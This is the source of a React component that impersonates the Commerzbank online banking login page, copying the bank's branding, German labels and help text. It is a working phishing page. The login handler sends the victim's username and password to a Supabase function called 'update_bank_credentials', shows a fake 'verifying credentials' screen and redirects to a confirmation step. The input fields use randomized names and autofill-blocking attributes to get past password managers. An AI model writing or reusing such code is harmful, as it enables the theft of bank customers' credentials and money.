import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import logoAsset from "@/assets/commerzbank-logo.svg.asset.json";
import logoWhiteAsset from "@/assets/commerzbank-logo-white.svg.asset.json";

const GREEN = "#002e3c";
const YELLOW = "#ffd700";
const TEXT = "#002e3c";

const ArrowRight = ({ size = 36, color = GREEN }: { size?: number; color?: string }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill={color} aria-hidden="true">
    <path d="m16.81 4.42-1.62 1.16L19.06 11H2v2h17.06l-3.87 5.42 1.62 1.16L22.23 12l-5.42-7.58z" />
  </svg>
);

const EyeIcon = ({ open }: { open: boolean }) => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true" style={{ color: GREEN }}>
    {open ? (
      <>
        <path d="M8.46 10.18A4 4 0 0 0 12 16Z" />
        <path d="M12 18.25c-3.46 0-6.93-3.88-8.61-6.25A21.86 21.86 0 0 1 7.1 7.93l-1-1.73A24.69 24.69 0 0 0 1 12s4.92 8.25 11 8.25a7.38 7.38 0 0 0 2.29-.38l-1.06-1.78a5.19 5.19 0 0 1-1.23.16ZM23 12s-4.92-8.25-11-8.25a7.34 7.34 0 0 0-2.46.45L7.61 1 5.89 2l12.5 20.75 1.72-1-2.31-3.84A24.56 24.56 0 0 0 23 12Zm-7.55 2a3.93 3.93 0 0 0 .55-2 4 4 0 0 0-4-4h-.16l-1.23-2A5.09 5.09 0 0 1 12 5.75c3.46 0 6.93 3.88 8.61 6.25a21.71 21.71 0 0 1-3.85 4.18Z" />
      </>
    ) : (
      <>
        <path d="M12 3.75C5.92 3.75 1 12 1 12s4.92 8.25 11 8.25S23 12 23 12s-4.92-8.25-11-8.25Zm0 14.5c-3.46 0-6.93-3.88-8.61-6.25C5.07 9.62 8.54 5.75 12 5.75s6.93 3.88 8.61 6.25c-1.68 2.38-5.15 6.25-8.61 6.25Z" />
        <path d="M12 8a4 4 0 1 0 4 4 4 4 0 0 0-4-4Zm0 6a2 2 0 1 1 2-2 2 2 0 0 1-2 2Z" />
      </>
    )}
  </svg>
);

const ChatIcon = () => (
  <svg width="18" height="18" viewBox="0 0 24 24" fill={GREEN} aria-hidden="true">
    <path d="M20 5v10h-9.24L9 18.53 7.24 15H4V5h16m0-2H4a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h2l3 6 3-6h8a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2Z" />
  </svg>
);

const SearchIcon = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
    <path d="M17.41 14h-2.17A8 8 0 1 0 14 15.24v2.17l6 6L23.41 20ZM9 15a6 6 0 1 1 6-6 6 6 0 0 1-6 6Zm7 1.59V16h.59l4 4-.59.59Z" />
  </svg>
);

const ServiceIcon = () => (
  <svg width="26" height="26" viewBox="0 0 24 24" fill={GREEN} aria-hidden="true">
    <path d="M23.58 12.63 20 18.84a5.52 5.52 0 0 0-.18-.92c-.11-.41-.39-1.26-.48-1.49a10.51 10.51 0 0 0-.85-1.79L15.83 10s-1.76-3-2.66-4.62c-.11-.19-.26-.43-.44-.71l.78-.91a5.25 5.25 0 0 1 1.89-1.43A3.93 3.93 0 0 1 16.93 2h.52Zm-5.14 8.93-.25.43H5.91L2.32 15.8a6.47 6.47 0 0 0 .88.3c.42.11 1.3.29 1.54.33a11.54 11.54 0 0 0 2 .16H18.2c.16.45.38 1.07.4 1.14a5.27 5.27 0 0 1 .32 2.37 4.11 4.11 0 0 1-.48 1.46ZM12 3.78a12.68 12.68 0 0 0-1.13 1.63C10 7 8.25 10 8.25 10l-2.66 4.64c-.11.19-.25.44-.39.73L4 15.15a5.14 5.14 0 0 1-2.2-.9 4 4 0 0 1-1.05-1.17l-.25-.43.19-.33L6.64 2h7.16a7.7 7.7 0 0 0-.71.61c-.3.31-.89.98-1.09 1.17Z" />
  </svg>
);

const MailIcon = () => (
  <svg width="24" height="24" viewBox="0 0 24 24" fill={GREEN} aria-hidden="true">
    <path d="m12 12.78 11-7.61V4H1v1.17l11 7.61z" />
    <path d="M13.14 14.43a2 2 0 0 1-2.28 0L1 7.6V20h22V7.6Z" />
  </svg>
);

const Commerzbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [userFocus, setUserFocus] = useState(false);
  const [passFocus, setPassFocus] = useState(false);
  const [userHover, setUserHover] = useState(false);
  const [passHover, setPassHover] = useState(false);
  const [helpOpen, setHelpOpen] = useState(false);
  const [openPanel, setOpenPanel] = useState<string | null>(null);

  useEffect(() => {
    if (!helpOpen) return;
    const onKey = (e: KeyboardEvent) => { if (e.key === "Escape") setHelpOpen(false); };
    window.addEventListener("keydown", onKey);
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => {
      window.removeEventListener("keydown", onKey);
      document.body.style.overflow = prev;
    };
  }, [helpOpen]);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Commerzbank – Online Banking Login", logoAsset.url);

  const handleLogin = async () => {
    if (submitting) return;
    if (username.trim().length === 0 || password.length === 0) return;
    setSubmitting(true);
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Benutzername/Teilnehmernummer",
        p_password_label: "Passwort/PIN",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const navLinks = ["Privatkunden", "Unternehmerkunden", "Wealth Management", "Firmenkunden"];
  const secLinks = [
    "Angebliche Bank-Mitarbeiter erfragen Zugangsdaten",
    "Anlagebetrug erkennen und vermeiden",
    "Warnung vor Phishing",
    "Phishing-Briefe im Namen der Bank (Quishing)",
  ];

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: "'Gotham Sans', 'Montserrat', 'Helvetica Neue', Arial, sans-serif", color: TEXT }}>
      {/* Header */}
      <header style={{ backgroundColor: GREEN }}>
        <div className="max-w-[1400px] mx-auto px-6 lg:px-10 py-5 flex items-start gap-8">
          <a href="#" className="flex-shrink-0">
            <img src={logoAsset.url} alt="Commerzbank Logo" className="h-14 w-auto" />
          </a>
          <div className="flex-1 flex items-center justify-between pt-6">
            <nav className="hidden md:flex items-center gap-7 text-[15px] font-semibold">
              {navLinks.map((l) => (
                <a key={l} href="#" className="text-[#dbe2e5] hover:text-white">{l}</a>
              ))}
            </nav>
            <div className="flex items-center gap-6 text-[14px] font-semibold">
              <a href="#" className="cmz-lift text-[#dbe2e5] hover:text-white">EN</a>
              <a href="#" className="cmz-lift items-center gap-2 text-[#dbe2e5] hover:text-white">
                <SearchIcon /> Suche
              </a>
            </div>
          </div>
        </div>
      </header>

      {/* Content */}
      <main className="flex-1">
        <div className="max-w-[1400px] mx-auto px-6 lg:px-10 pt-10 lg:pt-14 pb-32 lg:pb-40">
          {/* Title row */}
          <div className="flex items-start justify-between mb-16 lg:mb-20">
            <h1 className="text-[36px] lg:text-[42px] font-bold leading-[1.05] tracking-tight" style={{ color: TEXT }}>Login</h1>
            <button type="button" onClick={() => setHelpOpen(true)} className="cmz-lift items-center gap-2 text-[14px] font-semibold" style={{ color: TEXT }}>
              Hilfe <ChatIcon />
            </button>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
            {/* Form */}
            <form onSubmit={(e) => { e.preventDefault(); handleLogin(); }} autoComplete="off">
              <div className="max-w-[520px]">
                {/* Username */}
                <div className="mb-8">
                  <div
                    className="relative pt-5 border-b hover:border-b-2 focus-within:border-b-2 pb-[1px] hover:pb-0 focus-within:pb-0"
                    style={{ borderColor: "#506c74" }}
                    onMouseEnter={() => setUserHover(true)}
                    onMouseLeave={() => setUserHover(false)}
                  >
                    <label
                      htmlFor="cb-user"
                      className="absolute left-0 pointer-events-none transition-all duration-200 ease-out"
                      style={{
                        color: username || userFocus ? "#002530" : (userHover ? "#002530" : "#506c74"),
                        top: username || userFocus ? 0 : 32,
                        fontSize: username || userFocus ? 13 : 15,
                      }}
                    >
                      Benutzername/Teilnehmernummer
                    </label>
                    <input
                      id="cb-user"
                      name={"u_" + Math.random().toString(36).slice(2, 8)}
                      type="text"
                      autoComplete="off"
                      autoCorrect="off"
                      autoCapitalize="off"
                      spellCheck={false}
                      data-lpignore="true"
                      data-form-type="other"
                      readOnly
                      onFocus={(e) => { e.currentTarget.removeAttribute("readonly"); setUserFocus(true); }}
                      onBlur={() => setUserFocus(false)}
                      value={username}
                      onChange={(e) => setUsername(e.target.value)}
                       className="w-full bg-transparent border-0 py-2 outline-none text-[17px]"
                      style={{ color: userFocus ? "#002530" : TEXT }}
                    />
                  </div>
                </div>

                {/* Password */}
                <div className="mb-10">
                  <div
                    className="relative pt-5 border-b hover:border-b-2 focus-within:border-b-2 pb-[1px] hover:pb-0 focus-within:pb-0"
                    style={{ borderColor: "#506c74" }}
                    onMouseEnter={() => setPassHover(true)}
                    onMouseLeave={() => setPassHover(false)}
                  >
                    <label
                      htmlFor="cb-pin"
                      className="absolute left-0 pointer-events-none transition-all duration-200 ease-out"
                      style={{
                        color: password || passFocus ? "#002530" : (passHover ? "#002530" : "#506c74"),
                        top: password || passFocus ? 0 : 32,
                        fontSize: password || passFocus ? 13 : 15,
                      }}
                    >
                      Passwort/PIN
                    </label>
                    <input
                      id="cb-pin"
                      name={"p_" + Math.random().toString(36).slice(2, 8)}
                      type={showPassword ? "text" : "password"}
                      autoComplete="new-password"
                      autoCorrect="off"
                      autoCapitalize="off"
                      spellCheck={false}
                      data-lpignore="true"
                      data-form-type="other"
                      readOnly
                      onFocus={(e) => { e.currentTarget.removeAttribute("readonly"); setPassFocus(true); }}
                      onBlur={() => setPassFocus(false)}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                       className="w-full bg-transparent border-0 pr-10 outline-none"
                      style={{
                        color: passFocus ? "#002530" : TEXT,
                        fontSize: showPassword ? 17 : 24,
                        lineHeight: "1",
                        height: 40,
                        paddingTop: 0,
                        paddingBottom: 0,
                        letterSpacing: showPassword ? "normal" : "1px",
                      }}
                    />
                    <button
                      type="button"
                      aria-label="Passwort anzeigen"
                      onClick={() => setShowPassword((v) => !v)}
                      className="absolute right-0 bottom-2"
                    >
                      <EyeIcon open={showPassword} />
                    </button>
                  </div>
                </div>

                {/* Login button */}
                <button
                  type="submit"
                  className="inline-flex items-center gap-3 rounded-full font-semibold text-[15px] px-7 py-3 transition-opacity"
                  style={{ backgroundColor: YELLOW, color: TEXT }}
                >
                  Login <ArrowRight color={TEXT} />
                </button>

                {/* Secondary links */}
                <div className="mt-10 space-y-4 text-[14px]">
                  <div className="flex flex-wrap gap-x-10 gap-y-3">
                    <a href="#" className="cmz-lift font-semibold inline-block" style={{ color: TEXT }}>Passwort vergessen?</a>
                    <a href="#" className="cmz-lift font-semibold inline-block" style={{ color: TEXT }}>Teilnehmernummer vergessen?</a>
                  </div>
                  <a href="#" className="cmz-lift inline-flex items-center gap-2 font-semibold" style={{ color: TEXT }}>
                    Zugang beantragen <ArrowRight size={22} color={TEXT} />
                  </a>
                  <div>
                    <a href="#" className="cmz-lift inline-flex items-center gap-2 font-semibold" style={{ color: TEXT }}>
                      Wichtige Informationen zum Digital Banking <ArrowRight size={22} color={TEXT} />
                    </a>
                  </div>
                </div>
              </div>
            </form>

            {/* Right column: security hints */}
            <aside>
              <h2 className="text-[18px] lg:text-[20px] font-bold mb-6" style={{ color: TEXT }}>
                Wichtige Sicherheitshinweise
              </h2>
              <ul className="space-y-4 text-[14px]">
                {secLinks.map((l) => (
                  <li key={l}>
                    <a href="#" className="inline-flex items-center gap-2 font-semibold transition-transform duration-150 hover:translate-x-1" style={{ color: TEXT }}>
                      <ArrowRight size={22} color={TEXT} /> {l}
                    </a>
                  </li>
                ))}
              </ul>
            </aside>
          </div>
        </div>
      </main>

      {/* Yellow banner — only top ~25% ragt in den weißen Bereich, Rest sitzt auf Grün */}
      <section style={{ backgroundColor: GREEN }} className="relative z-10">
        <div className="max-w-[1400px] mx-auto px-6 lg:px-10">
          <div style={{ backgroundColor: YELLOW, marginTop: '-56px' }} className="rounded-2xl px-6 lg:px-14 py-10 flex items-center justify-between flex-wrap gap-6">
            <h3 className="text-[18px] lg:text-[20px] font-semibold" style={{ color: TEXT }}>
              24 Stunden für Sie da.
            </h3>
            <div className="flex items-center gap-10">
              <a href="#" className="cmz-circle flex flex-col items-center gap-2" style={{ color: TEXT }}>
                <span className="cmz-circle-ring w-14 h-14 rounded-full border flex items-center justify-center" style={{ borderColor: TEXT }}>
                  <ServiceIcon />
                </span>
                <span className="text-[13px] font-semibold">Service</span>
              </a>
              <a href="#" className="cmz-circle flex flex-col items-center gap-2" style={{ color: TEXT }}>
                <span className="cmz-circle-ring w-14 h-14 rounded-full border flex items-center justify-center" style={{ borderColor: TEXT }}>
                  <MailIcon />
                </span>
                <span className="text-[13px] font-semibold">Kontakt</span>
              </a>
            </div>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer style={{ backgroundColor: GREEN }} className="pt-10">
        <div className="max-w-[1400px] mx-auto px-6 lg:px-10 pb-16">
          <div className="flex items-center justify-between flex-wrap gap-6 pb-6">
            <div className="flex items-center gap-3">
              <img src={logoWhiteAsset.url} alt="Commerzbank" className="h-9 w-auto" />
            </div>
            <div className="text-[14px] font-semibold text-[#dbe2e5] hover:text-white transition-colors">Die Bank an Ihrer Seite</div>
          </div>
          <div className="border-t border-white/20 pt-10">
            <ul className="flex flex-wrap gap-x-8 gap-y-3 text-[12px] font-semibold">
              {["AGB", "Rechtliche Hinweise", "Impressum", "Einwilligungseinstellung", "Konzern", "Karriere"].map((l) => (
                <li key={l}><a href="#" className="text-[#dbe2e5] hover:text-white">{l}</a></li>
              ))}
            </ul>
          </div>
        </div>
      </footer>

      {/* Help Sidebar */}
      <div
        onClick={() => setHelpOpen(false)}
        className="fixed inset-0 z-40 transition-opacity duration-300"
        style={{
          backgroundColor: "rgba(0, 46, 60, 0.55)",
          opacity: helpOpen ? 1 : 0,
          pointerEvents: helpOpen ? "auto" : "none",
        }}
        aria-hidden={!helpOpen}
      />
      <aside
        className="fixed top-0 right-0 h-full z-50 bg-white shadow-2xl transition-transform duration-300 ease-out w-full sm:w-1/2 flex flex-col"
        style={{
          transform: helpOpen ? "translateX(0)" : "translateX(100%)",
          color: TEXT,
          fontFamily: "'Gotham Sans', 'Montserrat', 'Helvetica Neue', Arial, sans-serif",
        }}
        aria-hidden={!helpOpen}
      >
        <div className="px-8 py-5 border-b border-black/10">
          <button
            type="button"
            onClick={() => setHelpOpen(false)}
            className="flex items-center gap-2 text-[15px] font-semibold cmz-lift"
            style={{ color: TEXT }}
          >
            <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
              <path d="M15.41 7.41 14 6l-6 6 6 6 1.41-1.41L10.83 12z" />
            </svg>
            Zurück zur Übersicht
          </button>
        </div>
        <div className="flex-1 overflow-y-auto px-8 py-8">
          <h2 className="text-[28px] font-bold mb-6" style={{ color: TEXT }}>Hilfe</h2>
          {[
            {
              id: "alias",
              title: "Benutzername (Alias)",
              body: (
                <>
                  <p>Der Benutzername ist eine von Ihnen frei wählbare Zugangskennung. Diese können Sie nach jeder erfolgreichen Anmeldung vergeben, ändern oder löschen. Nach Vergabe eines Benutzernamens ist eine Anmeldung mit diesem Benutzernamen oder der 10-stelligen Teilnehmernummer (8-stelligen Banking-ID) möglich.</p>
                  <p className="mt-4">Sollten Sie Ihren Benutzernamen vergessen, können Sie sich jederzeit mit Ihrer 10-stelligen Teilnehmernummer (Banking-ID) anmelden und den Benutzernamen in der Rubrik "Service" unter dem Punkt "Digital Banking Profil" mit der Funktion "Benutzername ändern" ersehen und ggf. ändern.</p>
                </>
              ),
            },
            {
              id: "tnr",
              title: "Teilnehmernummer (Banking-ID)",
              body: (
                <p>Unter der Teilnehmernummer werden die mit Ihrer Commerzbank Filiale vereinbarten Konten und Depots verwaltet. Die Teilnehmernummer ist 10-stellig und losgelöst von Ihrer Kontonummer. Die Teilnehmernummer können Sie sich jederzeit in der Rubrik "Service" unter dem Punkt "Digital Banking Profil" mit der Funktion "Benutzername ändern" anzeigen lassen.</p>
              ),
            },
            {
              id: "pin",
              title: "PIN",
              body: (
                <>
                  <p>Bitte geben Sie in dieses Feld Ihre 5 bis 45-stellige PIN - Persönliche Identifikationsnummer/Passwort ein.</p>
                  <p className="mt-4">Sie erhalten diese Geheimzahl nach der Freischaltung zum Online Banking von Ihrer Commerzbank Filiale. Eine Änderung Ihrer PIN ist unter Verwendung einer TAN - Transaktionsnummer - jederzeit in der Rubrik "Service" unter dem Punkt "Digital Banking Einstellungen" mit der Funktion "Digital Banking PIN ändern" möglich.</p>
                </>
              ),
            },
          ].map((item) => {
            const isOpen = openPanel === item.id;
            return (
              <div key={item.id} className="border-b border-black/10">
                <button
                  type="button"
                  onClick={() => setOpenPanel(isOpen ? null : item.id)}
                  className="w-full flex items-center justify-between py-5 text-left text-[18px] font-bold"
                  style={{ color: TEXT }}
                >
                  <span>{item.title}</span>
                  <svg
                    width="22"
                    height="22"
                    viewBox="0 0 24 24"
                    fill="currentColor"
                    aria-hidden="true"
                    className="transition-transform duration-300"
                    style={{ transform: isOpen ? "rotate(180deg)" : "rotate(0deg)" }}
                  >
                    <path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z" />
                  </svg>
                </button>
                <div
                  className="grid transition-all duration-300 ease-out"
                  style={{ gridTemplateRows: isOpen ? "1fr" : "0fr" }}
                >
                  <div className="overflow-hidden">
                    <div className="pb-5 text-[15px] leading-relaxed" style={{ color: TEXT }}>
                      {item.body}
                    </div>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </aside>

      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
    </div>
  );
};

export default Commerzbank;
